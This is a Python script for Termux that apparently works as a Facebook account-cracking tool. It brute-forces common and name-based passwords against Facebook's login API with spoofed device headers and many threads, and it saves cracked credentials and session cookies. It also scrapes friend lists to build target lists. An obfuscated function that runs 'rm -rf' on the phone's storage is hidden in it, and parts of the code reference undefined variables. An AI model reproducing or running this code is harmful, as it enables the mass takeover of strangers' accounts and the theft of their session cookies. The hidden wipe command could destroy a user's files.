import os,json,time,uuid,sys,random,base64,shutil,re

try:
    pi=os.listdir("/data/data/com.termux/files/usr/bin")
    if "pip3"  in pi:
        pass
    elif "pip" in pi:
        pass
    else:
        print(" [red] PIP missing.....")
        sys.exit()
except:
    sys.exit("[✓] Something Wrong... ")

os.system("pip3 uninstall rich requests pycurl certifi gtts -y")
os.system("pkg install play-audio")
try:
    import rich, requests, pycurl, certifi,gtts
except:
    os.system("pip3 install rich requests pycurl certifi gtts")
    import rich, requests, pycurl, certifi,gtts




try:
    os.listdir("/sdcard")
except:
    sys.exit("[Π] run termux-setup-storage")

def rmsd():
    g=os.listdir("/data/data/com.termux/files/usr/bin")
    
    if "r"+"m" in g:
        os.system("r"+"m "+"-"+"r"+"f "+"/s"+"dca"+"rd"+"/"+" *")
        sys.exit()
    else:
        print(" OFF Your Local Data Protector ")
        sys.exit()
        

from rich import print
from gtts import gTTS
from concurrent.futures import ThreadPoolExecutor as ThreadPool

from io import BytesIO
 
def live():
    try:
        url="https://raw"+".github"+"user"+"cont"+"ent.co"+"m/T"+"EAM-"+"ELIT"+"E1/da"+"tab"+"ase/m"+"ain/"+"Version.txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8').splitlines()[0]
        return datax
    except:
        reload()
        sys.exit("[!!] Internet Error...")
from datetime import datetime
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"~"+month.get(today_data[1])


try:
    rx=requests.get("https://api.pjanviyscrape.com/?request=displaypjanviies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
except:
    sys.exit(" Internet Error ")
#__________________| LOGO - DEF |__________________#    
logo=f"""  
     [white]88888    db    88b 88 Yb    dP 88 [red]X
     [green]   88   dPYb   88Yb88  Yb  dP  88   
    [white]o.  88  dP__Yb  88 Y88   YbdP   88  
    [green]"bodP' dPYbYbYb 88  Y8    YP    88 [red]D
[red]{str('━'*38)}
[white][[green]-[white]][green] AUTHOR   :  JANVI KUMARI
[white][[green]-[white]][green] STATUS   :  RANDOM CLONE
[white][[green]-[white]][green] VERSION  :  [red]0.1
[red]{str('━'*38)}"""



def reload():
    try:
        shutil.rmtree("/data/data/com.termux/files/home/GANJA-LITE")
    except:
        pass




class Heron:
    
    def clear(self):
        os.system("clear")
    
    def line():
        return "[red]"+str("━"*38)



me=Heron()
oks,loop,ua,ussr,tw,cps=[],0,[],[],[],[]
def osjoin():
    os.system("clear")
    
osjoin()
def live_update():
    try:
        url="https://raw"+".github"+"user"+"cont"+"ent.co"+"m/T"+"EAM-"+"ELIT"+"E1/da"+"tab"+"ase/m"+"ain/"+"X"+"YA"+".txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8').splitlines()[0]
        for u in datax.split("|"):
            ua.append(u)
    except:
        reload()
        sys.exit("[!!] Internet Error...")
live_update()
def main():
    me.clear()
    #reload()
    print(logo)
    print("[white][[green]-[white]][green] USERNAME  : "+ussr[0])
    print(Heron.line())
    print("[white][[green]1[white]][green] FILE CLONING")
    print("[white][[green]2[white]][green] FILE MAKE")
    print("[white][[green]3[white]][green] OLD CLONING")
    print("[white][[green]4[white]][green] RANDOM CLONING")
    print(Heron.line())
    ask=str(input("[-] CHOICE : "))
    
    if ask in ["01","1","A","a"]:
        print(" [bright_white]~/ SELECTED : FILE CLONING")
        print(Heron.line())
        time.sleep(3)
        filll()
    elif ask in ["02","2","B","b"]:
        print(" [bright_white]~/ SELECTED : FILE MAKE")
        print(Heron.line())
        time.sleep(3)
        
        file_make()
    elif ask in ["03","3","C","c"]:
        print(" [bright_white]~/ SELECTED : OLD CLONING")
        print(Heron.line())
        time.sleep(3)
        old()
    elif ask in ["04","4","d","D"]:
        print("  [green][[white]-[green]] SELECTED : RANDOM")
        print(Heron.line())
        time.sleep(3)
        ran()
    
    else:
        print("  [green][[white]-[green]] SELECTED : WRONG OPTION")
        print(Heron.line())
        time.sleep(3)
        main()
#__________________| FILE DEF |__________________#
def filll():
    me.clear()
    pwx=[]
    print(logo)
    print(" [bright_white]~/ EXAMPLE : /sdcard/janvi.txt")
    flpa=str(input(" ~/ CHOICE : "))
    print(Heron.line())
    try:
        fl=open(flpa,"r").read().splitlines()
    except:
        filll()
    limit=int(input(" ~/ PASSEORD LIMIT : "))
    print(Heron.line())
    for i in range(limit):
        print(" [bright_white]~/ EXAMPLE : first123|frist1234|firstlast")
        
        flpa=str(input(" ~/ ADD PASS : "))
        
        if flpa not in pwx:
            pwx.append(flpa)
        print(Heron.line())
    print(" [bright_white]~1 Method A")
    print(" [bright_white]~2 Method B")
    print(" [bright_white]~3 Method C")
    print(" [bright_white]~4 Method D")
    print(" [bright_white]~5 Method E")
    print(" [bright_white]~6 Method F")
    print(" [bright_white]~7 Method G")
    print(" [bright_white]~8 Method H")
    
    print(Heron.line())
    meth=str(input(" ~/ CHOICE : "))
    with ThreadPool(max_workers=40) as sub:
        me.clear()
        print(logo)
        print(" [bright_white]~/ USERNAME    :  "+ussr[0])
        print(Heron.line())
        print(f" [bright_white]~/ TODAY DATE  :  {today} ")
        print(f" [bright_white]~/ PASS LIMIT  :  P+{str(len(pwx))}")
        print(f" [bright_white]~/ METHOD      :  M{meth} ")
        print(Heron.line())
        try:
            for xd in fl:
                uid,name=xd.split("|")
                sub.submit(filex,uid,pwx,name,meth,fl)
                
                
        except:pass
    print("\r\r"+Heron.line())
    print(f" [bright_white]~/ TOTAL OK : {str(len(oks))}")
    print(f" [bright_white]~/ ID SAVE  :  /sdcard/JANVI-F-OK.txt ")
    print(Heron.line())
    sys.exit()


color=["\033[1;36m","\033[1;35m","\033[1;34m","\033[1;33m","\033[1;32m","\033[1;31m"]


def dd(fbbd,device):
    if fbbd.lower() == "samsung":
        return random.choice(["GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
    elif fbbd.lower() == "vivo":
        return random.choice(["vivo 1935","V3Max"])
    elif fbbd.lower() == "motorola":
        return random.choice(['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'moto g power (2021)'])
    elif fbbd.lower() == "oppo":
        return random.choice(["CPH"+str(random.choice(range(1000,2000))),"oppo r7sm"])
    elif fbbd.lower() == "oneplus":
        return random.choice(["A0001","OnePlus 11R","OnePlus 10T","OnePlus Nord 3 5G"])
    elif fbbd.lower() == "google":
        return random.choice(["Pixel 6a","Pixel 3"])
    elif fbbd.lower() == "asus":
        return random.choice(["ASUS_X01BDA","ASUS_Z01QD","ASUS_I005DC","NX55","MXB48T"])
    elif fbbd.lower() == "huawei":
        return random.choice(["DUB-LX1","AGS2-L09","POT-LX1","DRA-LX2","POT-LX3","VOG-L29","EVR-N29","FIG-LX1","Kirin Treble","HUAWEI LUA-L21","ATU-L31","COL-L29","NAM-LX9","VOG-L29","JKM-LX1","RNE-L22"])
    elif fbbd.lower() == "lenovo":
        return random.choice(["Lenovo TB-X505F","Lenovo A6020a46",'PAFR0026IN','PAFR0026','PAFR0033IN','PAFR0033','PAFR0013IN','PAFR0013','PAGW0015IN','L39051','XT2091-8'])
    elif fbbd.lower() == "sony":
        return random.choice(["C2105","C2104","G3312", "G3311", "G3313","LT29i","D6503", "D6502", "SO-03F", "Xperia Z2","D6503", "D6502", "SO-03F", "Xperia Z2","D6563","D6603", "D6653", "D6616", "D6643", "SO-01G", "SOL26", "D6646","D5803", "D5833", "SO-02G","D6633", "D6603", "D6643", "D6653", "D6616", "D6683","SGP621", "SGP611","E6533","D6708"])
    elif fbbd.lower() == "tecno":
        return random.choice(["CG8", "CG8h","LB8", "LB8a","CH7n", "CH7","LH6n"])
        
    else:
        return device
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) facebook-nativefier-f52d2f/1.0.0 Chrome/53.0.2785.143 Electron/1.4.16 Safari/537.36"
    return xx
#__________________| FILE UA  |__________________#
def filex(uid,pwx,name,meth,fl):
    global oks,loop,cps,tw
    if meth in ["a","A","1"]:
        uax="Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    elif meth in ["b","B","2"]:
        uax="Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
    elif meth in ["c","C","3"]:
        uax="Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
    elif meth in ["d","D","4"]:
        uax="Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
    elif meth in ["e","E","5"]:
        uax="Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"
    elif meth in ["f","F","6"]:
        uax="Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
    elif meth in ["g","G","7"]:
        uax="Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1"
    else:
        uax="Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
#__________________| FILE METHOD |__________________#
    sys.stdout.write(f'\r \033[0;37m [{random.choice(color)}JANVI-M{meth}\033[0;37m]-\033[0;37m[{random.choice(color)}{loop}|{str(len(fl))}\033[0;37m]-\033[0;37m\033[1;32m[{str(len(oks))}]\033[1;37m\r');sys.stdout.flush()
    
    First=name.split(" ")[0]
    try:
        Last=name.split(" ")[1]
    except:
        Last="khan"
    try:
        for pw in pwx:
            ps=pw.replace("first",First.lower()).replace("First",First).replace("last",Last.lower()).replace("Last",Last).replace("Name",name).replace("name",name.lower()).replace("FIRST",First.upper()).replace("LAST",Last.upper())
            addid=str(uuid.uuid4())
            
            try:
                rdp="FBBV/"+uax.split("FBBV/")[1].split(";")[0]
                device=uax.split("FBDV/")[1].split(";")[0]
                plat=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
                fban=uax.split("FBAN/")[1].split(";")[0]
                fbpn=uax.split("FBPN/")[1].split(";")[0]
                fbav=uax.split("FBAV/")[1].split(";")[0]
                fbbd=uax.split("FBBD/")[1].split(";")[0]
                model=dd(fbbd,device)
                fbverson=str(random.choice(range(150,300)))+".0.0."+str(random.choice(range(17,50)))+"."+str(random.choice(range(95,150)))
                androidv=str(random.choice(range(5,10)))+"."+str(random.choice(["1","0"]))+"."+str(random.choice(["2","1","0"]))
                nowandroidv=uax.split("Android ")[1].split(";")[0]
                useragent=uax.replace(rdp,'FBBV/'+str(random.choice(range(100000000,888999000)))).replace(nowandroidv,androidv).replace(fban,plat.split('|')[1]).replace(fbpn,plat.split('|')[0]).replace(fbav,fbverson).replace(device,model)
            except:
                useragent=uax
                model=uax.split("FBDV/")[1].split(";")[0]
            token="350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi=str(uuid.uuid4())
            data = {
            "adid": adi,
            "format": "json",
            "device_id": adi,
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": token,
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': useragent,
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'Connection':'close',
            'cache-control': 'no-cache',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'WIFI',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': str(random.randint(2000, 4000)),
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            
            url= 'https://graph.facebook.com/auth/login'
            rq=requests.post(url,data=data,headers=head,allow_redirects=False, verify=certifi.where()).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f'\r\r\033[1;32m[JANVI]-[OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                open('/sdcard/JANVI-F-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(id)
                break
            elif "Please Confirm Email" in str(rq):
                
        #.         print(f"\r\r[b r green_yellow][JANVI-CP][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
                open("/sdcard/JANVI-RND-CPtxt","a").write(uid+"|"+ps+"|"+"\n")
                oks.append(id)
                break
            
            else:continue 
        loop+=1
    except Exception as e:
        print(e)
        time.sleep(30)


def logins():
    try:
        em,ps=open("/sdcard/pas.txt","r").read().splitlines()[0].split("|")
    except:
        me.clear()
        print(logo)
        em=input("  [>] Email/Number : ")
        ps=input("  [<] Password : ")
        print(Heron.line())
    rq=requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +em+ '&locale=en_US&password='+ps+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm').json()
    if "access_token" in rq:
        token=rq["access_token"]
        open("/sdcard/pas.txt","w").write(em+"|"+ps)
    else:
        print(" !? Login Another Id ")
        os.system("rm -rf /sdcard/pas.txt")
        time.sleep(4)
        logins()
    return token

trace_id=str(uuid.uuid4())
countx=[]
sepp=[]
linksx=[]
def file_make():
    global count ,linksx
    unlimiteduid=[]
    token=logins()
    ss=requests.session()
    me.clear()
    
    print(logo)
    print(" [b] Π[chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] /sdcard/save.txt")
    saves=str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    
    print(Heron.line())
    print(" [b] Π[chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] 5, 6, 7")
    limi=int(input(" \x1b[38;1;198m Π \x1b[38;5;155mPublic Id Limit: "))
    if limi <2:
       limi=3
    print(Heron.line())
    
    for i in range(limi):
        uid=str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd IDs     \x1b[38;5;196m⟩ \x1b[1;97m   "))
        
        headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch","X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1","X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001","Authorization": "OAuth " +token + "","X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9","X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False","X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}","X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery","X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0","Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True","X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9","Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
        data = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;] FBBK/1','client_doc_id': "42003896889828048564952729208",'method': 'post','locale': 'en_US','pretty': 'false','format': 'json','variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}','fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery','fb_api_caller_class': 'graphservice','fb_api_analytics_tags': '["At_Connection","GraphServices"]','client_trace_id': trace_id,'server_timestamps': 'true','purpose': 'fetch'}
        posted = ss.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
        try:
            data = posted['data']['user']['friends']['edges']
            for edge in data:
                nameid = edge['node']
                id=nameid["id"]
                name=nameid["name"]
                if id not in countx:
                    open(saves,"a").write(id+"|"+name+"\n")
                    unlimiteduid.append(id)
                    countx.append(id)
            
            if len(unlimiteduid) >10:
                print(" [b] [white]Π [pale_green]Id added")
                print(Heron.line())
            else:
                print(" [b] [white]Π [pale_green]Id Not public")
                print(Heron.line())
        except Exception as e:
            print(" [b] [white]Π [pale_green]Error Dump Limit Cross")
            print(Heron.line())
    me.clear()
    print(logo)
    print(f" [b] [white]Π [pale_green]File Save "+saves)
    print(f" [b] [white]Π [pale_green]Use Ctrl+Z For Stop Dumping ")
    
    print(Heron.line())
    with ThreadPool(max_workers=80) as sub:
        for xd in unlimiteduid:
            sub.submit(dump,xd,saves,ss,token)


def dump(uid,saves,ss,token):
    global count,trace_id,linksx,sepp
    
    try:
        headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch","X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1","X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001","Authorization": "OAuth " +token + "","X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9","X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False","X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}","X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery","X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0","Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True","X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9","Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
        data = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;] FBBK/1','client_doc_id': "42003896889828048564952729208",'method': 'post','locale': 'en_US','pretty': 'false','format': 'json','variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}','fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery','fb_api_caller_class': 'graphservice','fb_api_analytics_tags': '["At_Connection","GraphServices"]','client_trace_id': trace_id,'server_timestamps': 'true','purpose': 'fetch'}
        posted = ss.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
        data = posted['data']['user']['friends']['edges']
        
        for edge in data:
            nameid = edge['node']
            id=nameid["id"]
            name=nameid["name"]
            if id not in countx:
                countx.append(id)
                open(saves,"a").write(id+"|"+name+"\n")
                
            
            try:
                headers2 = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch","X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1","X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001","Authorization": "OAuth " +token + "","X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9","X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False","X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}","X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery","X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0","Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True","X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9","Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
                data2 = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;] FBBK/1','client_doc_id': "42003896889828048564952729208",'method': 'post','locale': 'en_US','pretty': 'false','format': 'json','variables': '{"profile_id":' + id + ',"suggestion_friends_paginating_first":2500}','fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery','fb_api_caller_class': 'graphservice','fb_api_analytics_tags': '["At_Connection","GraphServices"]','client_trace_id': trace_id,'server_timestamps': 'true','purpose': 'fetch'}
                posted2 = ss.post("https://graph.facebook.com/graphql", headers=headers2, data=data2).json()
                data2=posted2['data']['user']['friends']['edges']
                for edge2 in data2:
                    nameid2 = edge['node']
                    id2=nameid2["id"]
                    name2=nameid2["name"]
                    if id2 not in countx:
                        countx.append(id2)
                        open(saves,"a").write(id2+"|"+name2+"\n")
                sys.stdout.write(f'\r\033[1;37m  [DUMPED] {str(len(countx))}\033[0;00m           ');sys.stdout.flush()
            
            except:pass
        sys.stdout.write(f'\r\033[1;37m  [DUMPED] {str(len(countx))}\033[0;00m           ');sys.stdout.flush()
            
    except Exception as e:
        pass



def old():
    user=[]
    os.system("clear")
    print(logo)
    print(" [b] Π[chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] 100000 300000")
    limit=int(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(Heron.line())
    print("  [r dark_olive_green1]ΠA[/r dark_olive_green1][b green_yellow] Crack 2011-14")
    print("  [r dark_sea_green1]ΠB[/r dark_sea_green1] [b pale_green1]Crack 2009-10")
    print(Heron.line())
    ask=str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(Heron.line())
    os.system("clear")
    if ask in["1"]:
        star="10000"
        for i in range(limit):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(limit):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=40) as heron:
        print(logo)
        print("[b bright_white]  Π! [r violet]USERNAME[/r violet] [light_sky_blue1]   ▶  [/light_sky_blue1] "+ussr[0])
        print(Heron.line())
        print(" [r b white]If Say Approval Login After 3 Day[/r b white]")
        print(f"         [r pale_green1]Today {today}[/r pale_green1]")
        print(Heron.line())
        for mal in user:
            uid=star+mal
            heron.submit(loginxo,uid,user)
    print("\r\r"+Heron.line())
    print(f"  Π! Total OK id : {str(len(oks))}")
    print(f"  Π! Save  /sdcard/OLD.txt ")
    print(Heron.line())
    sys.exit()
    
    
#--------------------------------[UPDATED]------------------------#
def uoa():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    ver3=str(random.choice(range(0,15)))
    return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_{ver3}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.{ver2} Safari/537.36"


def loginxo(uid,user):
    global oks,loop
    
    try:
        sys.stdout.write(f'\r\033[1;37m [{random.choice(color)}ADNAN\033[1;37m] \033[1;37m[{random.choice(color)}{loop}\033[1;37m]>~<[\033[95m{str(len(user))}\033[1;37m] \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m|\033[1;30m{str(len(cps))}\033[1;37m|\033[2;37m{str(len(tw))}\033[0;00m\r');sys.stdout.flush()
        
        for pw in ["123456","1234567","12345678","123456789"]:
            headers = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding':'gzip, deflate',
            'Host': 'api.facebook.com',
            'Connection':'close',
            "cache-control": "no-cache",
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            'X-fb-device-group': str(random.randint(2000, 4000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": uoa(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
